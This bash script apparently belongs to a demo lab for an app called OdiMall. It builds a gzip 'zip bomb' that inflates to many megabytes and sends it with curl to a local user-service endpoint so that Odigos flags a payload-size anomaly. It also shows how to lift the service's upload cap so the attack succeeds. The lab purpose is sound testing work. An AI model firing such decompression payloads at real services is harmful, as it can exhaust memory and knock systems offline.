#!/usr/bin/env bash
#
# zipbomb-attack.sh — OdiMall oversized / compressed-upload ("zip bomb") attack
# ---------------------------------------------------------------------------
# Sends a tiny gzip-compressed HTTP body that inflates into a huge JSON payload
# to user-service's POST /users/shipping. A normal shipping form is a few
# hundred bytes; this expands to many megabytes in memory. That inflated size is
# the deviation Odigos flags against the "Payload size" baseline.
#
# IMPORTANT
#   * Target user-service DIRECTLY (not the api-gateway). The gateway re-encodes
#     request bodies and strips Content-Encoding: gzip, so the bomb must hit
#     user-service itself.
#   * The attack only "lands" when user-service runs with LARGE_UPLOADS_ENABLED=true
#     (helm: userService.largeUploads=true). With the safe default it is rejected
#     at 100kb (HTTP 413) — which is itself a fine "blocked" data point.
#
# USAGE
#   # 1) open a tunnel to user-service in another terminal:
#   kubectl port-forward -n odimall svc/user-service 8084:8084
#
#   # 2) run the attack:
#   ./zipbomb-attack.sh                 # 20MB inflated (default)
#   SIZE_MB=40 ./zipbomb-attack.sh      # bigger (watch the 256Mi pod limit!)
#
#   # or let the script manage the port-forward for you:
#   PORT_FORWARD=1 ./zipbomb-attack.sh
#
# ENV
#   TARGET        base URL of user-service   (default http://localhost:8084)
#   SIZE_MB       inflated payload size in MB (default 20; keep < ~60 for a 256Mi pod)
#   SESSION       shipping session id         (default attacker-zipbomb)
#   PORT_FORWARD  1 = start/stop kubectl port-forward automatically
#   NAMESPACE     k8s namespace for PORT_FORWARD (default odimall)
#
set -euo pipefail

TARGET="${TARGET:-http://localhost:8084}"
SIZE_MB="${SIZE_MB:-20}"
SESSION="${SESSION:-attacker-zipbomb}"
NAMESPACE="${NAMESPACE:-odimall}"
PORT_FORWARD="${PORT_FORWARD:-0}"

command -v python3 >/dev/null || { echo "python3 is required"; exit 1; }

workdir="$(mktemp -d)"
bomb="$workdir/bomb.json.gz"
pf_pid=""

cleanup() {
  [ -n "$pf_pid" ] && kill "$pf_pid" 2>/dev/null || true
  rm -rf "$workdir"
}
trap cleanup EXIT

if [ "$PORT_FORWARD" = "1" ]; then
  echo "• starting port-forward svc/user-service 8084:8084 (ns=$NAMESPACE)…"
  kubectl port-forward -n "$NAMESPACE" svc/user-service 8084:8084 >/dev/null 2>&1 &
  pf_pid=$!
  TARGET="http://localhost:8084"
  sleep 3
fi

echo "• building a ${SIZE_MB}MB payload and gzip-compressing it…"
# Build a valid JSON shipping record whose "address" field is SIZE_MB of filler,
# then gzip the whole thing. Repeated bytes compress enormously → a tiny wire
# payload that inflates back to SIZE_MB on the server.
python3 - "$bomb" "$SIZE_MB" "$SESSION" <<'PY'
import gzip, json, sys
out, size_mb, session = sys.argv[1], int(sys.argv[2]), sys.argv[3]
filler = "A" * (size_mb * 1024 * 1024)
body = json.dumps({
    "sessionId": session,
    "name": "zip bomb",
    "address": filler,
    "city": "x", "state": "x", "zip": "00000",
}).encode()
with open(out, "wb") as f:
    f.write(gzip.compress(body, 9))
sys.stderr.write(f"inflated_bytes={len(body)}\n")
PY

wire_bytes=$(wc -c < "$bomb" | tr -d ' ')
inflated_bytes=$(( SIZE_MB * 1024 * 1024 ))
ratio=$(( inflated_bytes / (wire_bytes>0 ? wire_bytes : 1) ))

echo
echo "  wire size (gzip on the network): $(printf "%'d" "$wire_bytes") bytes  (~$(( wire_bytes / 1024 )) KB)"
echo "  inflated size (in the server):   $(printf "%'d" "$inflated_bytes") bytes  (${SIZE_MB} MB)"
echo "  compression ratio:               ~${ratio}x"
echo

echo "• firing at ${TARGET}/users/shipping (Content-Encoding: gzip)…"
http_code=$(curl -s -o "$workdir/resp.txt" -w '%{http_code}' \
  -X POST "${TARGET}/users/shipping" \
  -H 'Content-Type: application/json' \
  -H 'Content-Encoding: gzip' \
  -H 'User-Agent: zipbomb-poc/1.0' \
  -H 'X-OdiMall-Origin: anomalous' \
  -H 'X-Forwarded-For: 203.0.113.66' \
  --data-binary @"$bomb" || echo "000")

echo
echo "  HTTP status: $http_code"
echo "  response:    $(cat "$workdir/resp.txt")"
echo
case "$http_code" in
  200) echo "✓ Attack landed. user-service inflated and accepted ${SIZE_MB}MB."
       echo "  → Check the POST /users/shipping span: its request payload is ~$(( inflated_bytes / 1024 ))KB vs a baseline of a few hundred bytes." ;;
  413) echo "✗ Rejected at the 100kb cap (LARGE_UPLOADS_ENABLED=false)."
       echo "  → Enable it to let the attack land:  helm upgrade odimall ./helm/odimall -n $NAMESPACE --reuse-values --set userService.largeUploads=true" ;;
  000) echo "✗ Could not reach $TARGET. Is the port-forward running? (try PORT_FORWARD=1)" ;;
  *)   echo "• Unexpected status $http_code — see response above." ;;
esac
